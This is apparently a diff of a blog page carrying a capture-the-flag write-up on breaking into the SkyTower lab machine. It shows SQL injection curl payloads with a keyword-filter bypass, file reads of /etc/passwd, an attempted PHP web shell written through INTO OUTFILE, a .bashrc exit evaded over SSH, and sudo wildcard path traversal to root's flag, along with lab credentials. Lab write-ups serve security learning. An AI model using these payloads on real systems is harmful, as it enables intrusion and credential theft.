+   &lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>font</span> <span style=color:#a6e22e>size</span><span style=color:#f92672>=</span><span style=color:#e6db74>4</span>&gt;Welcome john@skytech.com&lt;/<span style=color:#f92672>font</span>&gt;&lt;<span style=color:#f92672>br</span> /&gt; &lt;/<span style=color:#f92672>br</span>&gt;&lt;/<span style=color:#f92672>strong</span>&gt;As you may know, SkyTech has ceased all international operations.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; To all our long term employees, we wish to convey our thanks for your dedication and hard work.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; The remainder of your contract and retirement fund, &lt;<span style=color:#f92672>strong</span>&gt;$2&lt;/<span style=color:#f92672>strong</span>&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Username: john&lt;/<span style=color:#f92672>strong</span>&gt;&lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>strong</span>&gt;Password: hereisjohn&lt;/<span style=color:#f92672>strong</span>&gt; &lt;<span style=color:#f92672>br</span>&gt;&lt;<span style=color:#f92672>br</span>&gt; We wish you the best of luck in your future endeavors. &lt;<span style=color:#f92672>br</span>&gt; &lt;/<span style=color:#f92672>div</span>&gt; &lt;/<span style=color:#f92672>div</span>&gt;&lt;/<span style=color:#f92672>HTML</span>&gt;%
 </code></pre></div><p>And success. We have made some progress :D Little did I know that I don&rsquo;t actually completely understand the progress made yet, but just keep this in mind :)</p>
-<h2 id="climbing-the-tower-and-faling-hard">climbing the tower and faling hard</h2>
+<h2 id=climbing-the-tower-and-faling-hard>climbing the tower and faling hard</h2>
 <p>From the auth bypass results, we can see specific mention for users to SSH into the server. This particular user has a username <code>john</code> and a password <code>hereisjohn</code>. So lets try this.
 I setup my <code>proxychains</code> install to use the http proxy available on the server (<code>http 192.168.137.242 3128</code>) and opened a SSH session through it:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains4 ssh john@127.0.0.1
-[snip]
-[proxychains] Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
-john@127.0.0.1&#39;s password:
-Linux SkyTower 3.2.0-4-amd64 <span style="color:#0f0">#1 SMP Debian 3.2.54-2 x86_64</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ proxychains4 ssh john@127.0.0.1
+<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
+<span style=color:#f92672>[</span>proxychains<span style=color:#f92672>]</span> Strict chain  ...  192.168.137.242:3128  ...  127.0.0.1:22  ...  OK
+john@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
+Linux SkyTower 3.2.0-4-amd64 <span style=color:#75715e>#1 SMP Debian 3.2.54-2 x86_64</span>
 
 The programs included with the Debian GNU/Linux system are free software;
-the exact distribution terms <span style="color:#f00">for</span> each program are described in the
+the exact distribution terms <span style=color:#66d9ef>for</span> each program are described in the
 individual files in /usr/share/doc/*/copyright.
 
 Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
 permitted by applicable law.
-Last login: Thu Jul <span style="color:#f60">17</span> 12:54:32 <span style="color:#f60">2014</span> from localhost
+Last login: Thu Jul <span style=color:#ae81ff>17</span> 12:54:32 <span style=color:#ae81ff>2014</span> from localhost
 
 Funds have been withdrawn
 Connection to 127.0.0.1 closed.
 $
-</code></pre></div><p>&hellip; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
-<h2 id="more-sql-injection">more sql injection</h2>
+</code></pre></div><p>&mldr; ok. So we get a session, and are told <em>Funds have been withdrawn</em>, and get the connection closed. Not exactly what I hoped for. Thinking what could cause this behavior, my mind went on to things like a custom shell, <code>.bashrc</code> files (assuming the user has bash a a shell) etc. So, I figured there may be more users on the system and I should try get those credentials too. After all, we have a working SQL injection point.</p>
+<h2 id=more-sql-injection>more sql injection</h2>
 <p>So back to the SQLi point it was. Taking a wild guess, I assumed there is a <code>users</code> table, and the table will have a primary key of <code>id</code>. So, <code>john</code> may have id 1, and a next user have id 2. So I modified the query slightly:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl --data <span style="color:#87ceeb">&#34;email=foo@bar&amp;password=&#39; || id=1#&#34;</span> http://192.168.137.242/login.php
-There was an error running the query [Unknown column <span style="color:#87ceeb">&#39;id1&#39;</span> in <span style="color:#87ceeb">&#39;where clause&#39;</span>]%
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; || id=1#&#34;</span> http://192.168.137.242/login.php
+There was an error running the query <span style=color:#f92672>[</span>Unknown column <span style=color:#e6db74>&#39;id1&#39;</span> in <span style=color:#e6db74>&#39;where clause&#39;</span><span style=color:#f92672>]</span>%
 </code></pre></div><p>Well I definitely didn&rsquo;t ask for the column <code>id1</code>, but from this again it was apparent that <code>=</code> was filtered along with <code>OR</code>. :| Ok, so we change the payload again:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl --data <span style="color:#87ceeb">&#34;email=foo@bar&amp;password=&#39; || id &gt; 1#&#34;</span> http://192.168.137.242/login.php
-[snip]
-&lt;br&gt;&lt;strong&gt;&lt;font <span style="color:#eedd82">size</span>=4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style="color:#f00">for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span style="color:#eedd82">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; || id &gt; 1#&#34;</span> http://192.168.137.242/login.php
+<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
+&lt;br&gt;&lt;strong&gt;&lt;font size<span style=color:#f92672>=</span>4&gt;Welcome sara@skytech.com&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style=color:#66d9ef>for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: sara&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: ihatethisjob&lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;%
 </code></pre></div><p>Yay, my guess on the <code>id</code> column was correct, and I now had a second users details. I continued to increment the <code>id</code>, and ended up with 3 accounts:</p>
 <ul>
 <li>john:hereisjohn</li>
 <li>sara:ihatethisjob</li>
 <li>william:senseable</li>
 </ul>
-<p>The users <code>john</code> &amp; <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
-<h2 id="more-sql-enumeration">more SQL enumeration</h2>
+<p>The users <code>john</code> & <code>sara</code> both had the same behavior when attempting login via SSH, and the user <code>william</code> appears to have had an incorrect password. So, again the results were not exactly what I hoped for.</p>
+<h2 id=more-sql-enumeration>more SQL enumeration</h2>
 <p>At this stage, I was thinking there must be more information in the database, and I should try and read some files from disk in order to gain a better understanding of what is going on here.</p>
-<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> &amp; <code>--risk 3</code> there was no joy. This is ok.</p>
-<p>I studied the error messages in detail, googled&hellip; a lot&hellip; and eventually came across <a href="http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html">this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
+<p>Fast forward a few hours, I discovered that a few more keywords and symbols were filtered. The hardest being the realization that a <code>union select</code> was not working as expected so that I can enumerate the columns. Even though the initial entry on vulnhub mentioned that automated tools would probably not work, I figured in this case that I had a valid SQLi, I could just make use of some SQLMap automagic. Again <em>NOPE</em>. Even with <code>--level 3</code> & <code>--risk 3</code> there was no joy. This is ok.</p>
+<p>I studied the error messages in detail, googled&mldr; a lot&mldr; and eventually came across <a href=http://zoczus.blogspot.nl/2013/03/sql-injection-without-comma-char.html>this</a> blogpost, detailing a way to get a union working without the ability to use commas. I should also note that I managed to bypass the <code>SELECT</code> filter by using <code>SELECSELECTT</code> in the payload. Assuming that the filter was a simple <code>str_replace()</code>, this left me with <code>SELECT</code> after the pass.</p>
 <p>For the sake of brevity I am not going to detail all of the methods I used in order to exploit the SQLi and get value out of it. I managed to learn that the database user used by the PHP application was root. The query used in <code>login.php</code> returned 3 columns. One particular payload of interest that uses the method in the previously mentioned blog post, was used to start reading files from the servers disk. More specifically, <code>/etc/passwd</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl --data <span style="color:#87ceeb">&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&#34;</span> http://192.168.137.242/login.php
-[snip]
-&lt;br&gt;&lt;strong&gt;&lt;font <span style="color:#eedd82">size</span>=4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style="color:#f00">for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;<span style="color:#eedd82">$2</span>&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root:x:0:0:root:/root:/bin/bash
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt load_file(&#39;/etc/password&#39;)) as c#&#34;</span> http://192.168.137.242/login.php
+<span style=color:#f92672>[</span>snip<span style=color:#f92672>]</span>
+&lt;br&gt;&lt;strong&gt;&lt;font size<span style=color:#f92672>=</span>4&gt;Welcome 222&lt;/font&gt;&lt;br /&gt; &lt;/br&gt;&lt;/strong&gt;As you may know, SkyTech has ceased all international operations.&lt;br&gt;&lt;br&gt; To all our long term employees, we wish to convey our thanks <span style=color:#66d9ef>for</span> your dedication and hard work.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Unfortunately, all international contracts, including yours have been terminated.&lt;/strong&gt;&lt;br&gt;&lt;br&gt; The remainder of your contract and retirement fund, &lt;strong&gt;$2&lt;/strong&gt; ,has been payed out in full to a secure account.  For security reasons, you must login to the SkyTech server via SSH to access the account details.&lt;br&gt;&lt;br&gt;&lt;strong&gt;Username: 222&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;Password: root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
 bin:x:2:2:bin:/bin:/bin/sh
 sys:x:3:3:sys:/dev:/bin/sh
@@ -363,7 +223,7 @@ www-data:x:33:33:www-data:/var/www:/bin/sh
 backup:x:34:34:backup:/var/backups:/bin/sh
 list:x:38:38:Mailing List Manager:/var/list:/bin/sh
 irc:x:39:39:ircd:/var/run/ircd:/bin/sh
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/bin/sh
 nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
 libuuid:x:100:101::/var/lib/libuuid:/bin/sh
 sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
@@ -373,217 +233,78 @@ sara:x:1001:1001:,,,:/home/sara:/bin/bash
 william:x:1002:1002:,,,:/home/william:/bin/bash
 &lt;/strong&gt; &lt;br&gt;&lt;br&gt; We wish you the best of luck in your future endeavors. &lt;br&gt; &lt;/div&gt; &lt;/div&gt;&lt;/HTML&gt;
 </code></pre></div><p>Reading the <code>/etc/passwd</code> revealed that there were no custom shells used for the users that were enumerated previously. O..k.. I also pulled the sources of <code>login.php</code> in order to understand what the deal with the filtering was:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#eedd82">$sqlinjection</span> = <span style="color:#f00">array</span>(<span style="color:#87ceeb">&#34;SELECT&#34;</span>, <span style="color:#87ceeb">&#34;TRUE&#34;</span>, <span style="color:#87ceeb">&#34;FALSE&#34;</span>, <span style="color:#87ceeb">&#34;--&#34;</span>,<span style="color:#87ceeb">&#34;OR&#34;</span>, <span style="color:#87ceeb">&#34;=&#34;</span>, <span style="color:#87ceeb">&#34;,&#34;</span>, <span style="color:#87ceeb">&#34;AND&#34;</span>, <span style="color:#87ceeb">&#34;NOT&#34;</span>);
-<span style="color:#eedd82">$email</span> = str_ireplace(<span style="color:#eedd82">$sqlinjection</span>, <span style="color:#87ceeb">&#34;&#34;</span>, <span style="color:#eedd82">$_POST</span>[<span style="color:#87ceeb">&#39;email&#39;</span>]);
-<span style="color:#eedd82">$password</span> = str_ireplace(<span style="color:#eedd82">$sqlinjection</span>, <span style="color:#87ceeb">&#34;&#34;</span>, <span style="color:#eedd82">$_POST</span>[<span style="color:#87ceeb">&#39;password&#39;</span>]);
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php>$sqlinjection <span style=color:#f92672>=</span> <span style=color:#66d9ef>array</span>(<span style=color:#e6db74>&#34;SELECT&#34;</span>, <span style=color:#e6db74>&#34;TRUE&#34;</span>, <span style=color:#e6db74>&#34;FALSE&#34;</span>, <span style=color:#e6db74>&#34;--&#34;</span>,<span style=color:#e6db74>&#34;OR&#34;</span>, <span style=color:#e6db74>&#34;=&#34;</span>, <span style=color:#e6db74>&#34;,&#34;</span>, <span style=color:#e6db74>&#34;AND&#34;</span>, <span style=color:#e6db74>&#34;NOT&#34;</span>);
+$email <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>($sqlinjection, <span style=color:#e6db74>&#34;&#34;</span>, $_POST[<span style=color:#e6db74>&#39;email&#39;</span>]);
+$password <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_ireplace</span>($sqlinjection, <span style=color:#e6db74>&#34;&#34;</span>, $_POST[<span style=color:#e6db74>&#39;password&#39;</span>]);
 </code></pre></div><p>And as suspected. :)</p>
 <p>One last thing that I tried, really hard, was to get a web shell on the server so that I can further explore the environment. This failed miserably. The closest I was able to get was:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl --data <span style="color:#87ceeb">&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec(</span><span style="color:#eedd82">$_GET</span><span style="color:#87ceeb">[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&#34;</span> http://192.168.137.242/login.php
-There was an error running the query [Can<span style="color:#87ceeb">&#39;t create/write to file &#39;</span>/var/www/shell.php&#39; (Errcode: 13)]
-</code></pre></div><p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&hellip;
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ curl --data <span style=color:#e6db74>&#34;email=foo@bar&amp;password=&#39; or union selecselectt * from (selecselectt 111) as a JOIN (selecselectt 222) as b JOIN (selecselectt &#39;&lt;?php print_r(shell_exec(</span>$_GET<span style=color:#e6db74>[cmd])); ?&gt;&#39;) as c into outfile &#39;/var/www/shell.php&#39;#&#34;</span> http://192.168.137.242/login.php
+There was an error running the query <span style=color:#f92672>[</span>Can<span style=color:#e6db74>&#39;t create/write to file &#39;</span>/var/www/shell.php<span style=color:#960050;background-color:#1e0010>&#39;</span> <span style=color:#f92672>(</span>Errcode: 13<span style=color:#f92672>)]</span>
+</code></pre></div><p>This obviously alludes to the fact that the user MySQL is running as des not have access to write to the web folder. It was time to rethink what was going on here&mldr;
 Oh yes, I obviously tried to just cat <code>/root/flag.txt</code>, but didn’t expect it to be <em>that</em> easy :D</p>
-<h2 id="gaining-further-access">gaining further access</h2>
+<h2 id=gaining-further-access>gaining further access</h2>
 <p>After spending a really long time with the SQL injections, I decided to relook the SSH section. From the SQL injection that I learnt that there don&rsquo;t <em>appear</em> to be any custom shells in use, so the other thing this could be is a <code>.bashrc</code> with a <code>exit</code> command. I know its <code>.bashrc</code> because I saw the shell is <code>/bin/bash</code> from the <code>/etc/passwd</code>. I remember that I make heavy use of <code>ssh -t</code> to execute commands on the remove server, usually to setup multiple tunnels into a network, so I thought it will come in handy here.</p>
 <p>For this case though, I though I&rsquo;d specify a <code>/bin/sh</code> as the <em>command</em> to run, hoping to not get caught in a <code>.bashrc</code> running:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
-john@127.0.0.1&#39;s password:
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ proxychains4 -q ssh john@127.0.0.1 -t /bin/sh
+john@127.0.0.1<span style=color:#960050;background-color:#1e0010>&#39;</span>s password:
 $ id
-<span style="color:#eedd82">uid</span>=1000(john) <span style="color:#eedd82">gid</span>=1000(john) <span style="color:#eedd82">groups</span>=1000(john)
+uid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> gid<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span> groups<span style=color:#f92672>=</span>1000<span style=color:#f92672>(</span>john<span style=color:#f92672>)</span>
 </code></pre></div><p>Woop! I was now logged in as <code>john</code>. I inspected the <code>.bashrc</code> file and saw that at the end there was:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">echo
-echo  <span style="color:#87ceeb">&#34;Funds have been withdrawn&#34;</span>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>echo
+echo  <span style=color:#e6db74>&#34;Funds have been withdrawn&#34;</span>
 exit
-</code></pre></div><p>&hellip; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>
-<h2 id="enumeration-enumeration-enumeration">enumeration enumeration enumeration</h2>
-<p>I enumerated, everything&hellip; Referring to a excellent <a href="http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">john@SkyTower:/accounts$ ls -lah /accounts/
+</code></pre></div><p>&mldr; a exit. I simply removed the line. Now the almost obvious next step was to inspect and enumerate as much as possible. The most obvious thing that came to mind was privilege escalation as I was simply a normal user on the system at the moment.</p>
+<h2 id=enumeration-enumeration-enumeration>enumeration enumeration enumeration</h2>
+<p>I enumerated, everything&mldr; Referring to a excellent <a href=http://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>post by g0tm1lk</a> nothing aparent came up. The only semi strange thing was a empty <code>/accounts/</code> directory:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>john@SkyTower:/accounts$ ls -lah /accounts/
 total 8.0K
-drwxr-xr-x  <span style="color:#f60">2</span> root root 4.0K Jun <span style="color:#f60">20</span> 07:52 .
-drwxr-xr-x <span style="color:#f60">24</span> root root 4.0K Jun <span style="color:#f60">20</span> 07:52 ..
-</code></pre></div><p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&hellip;</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sara@SkyTower:~$ sudo -l
-Matching Defaults entries <span style="color:#f00">for</span> sara on this host:
-    env_reset, mail_badpass, <span style="color:#eedd82">secure_path</span>=/usr/local/sbin<span style="color:#87ceeb">\:</span>/usr/local/bin<span style="color:#87ceeb">\:</span>/usr/sbin<span style="color:#87ceeb">\:</span>/usr/bin<span style="color:#87ceeb">\:</span>/sbin<span style="color:#87ceeb">\:</span>/bin
+drwxr-xr-x  <span style=color:#ae81ff>2</span> root root 4.0K Jun <span style=color:#ae81ff>20</span> 07:52 .
+drwxr-xr-x <span style=color:#ae81ff>24</span> root root 4.0K Jun <span style=color:#ae81ff>20</span> 07:52 ..
+</code></pre></div><p>Other than that things seemed pretty normal. I decided to check out the other user <code>sara</code> too. This user has a similar <code>exit</code> in the <code>.bashrc</code> which I just removed. There was one distinct difference during enumeration though&mldr;</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sara@SkyTower:~$ sudo -l
+Matching Defaults entries <span style=color:#66d9ef>for</span> sara on this host:
+    env_reset, mail_badpass, secure_path<span style=color:#f92672>=</span>/usr/local/sbin<span style=color:#ae81ff>\:</span>/usr/local/bin<span style=color:#ae81ff>\:</span>/usr/sbin<span style=color:#ae81ff>\:</span>/usr/bin<span style=color:#ae81ff>\:</span>/sbin<span style=color:#ae81ff>\:</span>/bin
 
 User sara may run the following commands on this host:
-    (root) NOPASSWD: /bin/cat /accounts/*, (root) /bin/ls /accounts/*
+    <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> NOPASSWD: /bin/cat /accounts/*, <span style=color:#f92672>(</span>root<span style=color:#f92672>)</span> /bin/ls /accounts/*
 </code></pre></div><p>This user may execute some commands as root using <code>sudo</code>. <code>sudo</code> allows you to specify what those commands are, if not all. There was one problem with this configuration though. <code>*</code> is a wildcard character, and as such, anything after <code>cat /accounts/</code> may also be run. This means that things like <code>sudo cat /accounts/../../etc/shadow</code> will work as the wildcard allows us to do a form of directory traversal.</p>
-<h2 id="pwnd">pwnd</h2>
+<h2 id=pwnd>pwnd</h2>
 <p>So, to complete SkyTower:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>sara@SkyTower:~$ sudo cat /accounts/../../root/flag.txt
 Congratz, have a cold one to celebrate!
 root password is theskytower
-</code></pre></div><p>Thanks to <a href="https://twitter.com/telspacesystems">@telspacesystems</a> for the fun experience. I learnt something so for this was totally worth it!</p>
-    </div>
-  </article>
-
-  
-  
-
-
-
-
-  
-    <div class="blog-post-comments">
-        <div id="disqus_thread">
-          <script type="text/javascript">
-          
-          (function() {
-              
-              
-              
-              
-          
-              var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
-              var disqus_shortname = 'slashnote';
-              dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
-              (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
-          })();
-          </script>
-          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-        </div>
-    </div>
-
-  
-
-
-  <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-         
-          <li><a href="https://leonjza.github.io/">Home</a></li>
-         
-          <li><a href="https://leonjza.github.io/categories">Categories</a></li>
-         
-          <li><a href="https://leonjza.github.io/posts">Posts</a></li>
-         
-          <li><a href="https://leonjza.github.io/about/">About Me</a></li>
-        
-      </ul>
-    </div>
-
-    <div id="toc-footer" style="display: none">
-      <nav id="TableOfContents">
-  <ul>
-    <li><a href="#foreword">foreword</a></li>
-    <li><a href="#starting-off">starting off</a></li>
-    <li><a href="#learn-all-you-can">learn all you can</a></li>
-    <li><a href="#climbing-the-tower-and-faling-hard">climbing the tower and faling hard</a></li>
-    <li><a href="#more-sql-injection">more sql injection</a></li>
-    <li><a href="#more-sql-enumeration">more SQL enumeration</a></li>
-    <li><a href="#gaining-further-access">gaining further access</a></li>
-    <li><a href="#enumeration-enumeration-enumeration">enumeration enumeration enumeration</a></li>
-    <li><a href="#pwnd">pwnd</a></li>
-  </ul>
-</nav>
-    </div>
-
-    <div id="share-footer" style="display: none">
-      
-      <ul>
-  
-  
-    
-  
-  
-  <li>
-    <a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f" aria-label="Facebook">
-      <i class="fab fa-facebook fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="https://twitter.com/share?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&text=Climbing%20the%20SkyTower" aria-label="Twitter">
-      <i class="fab fa-twitter fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
-    <a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2fleonjza.github.io%2fblog%2f2014%2f07%2f17%2fclimbing-the-skytower%2f&title=Climbing%20the%20SkyTower" aria-label="Linkedin">
-      <i class="fab fa-linkedin fa-lg" aria-hidden="true"></i>
-    </a>
-  </li>
-  <li>
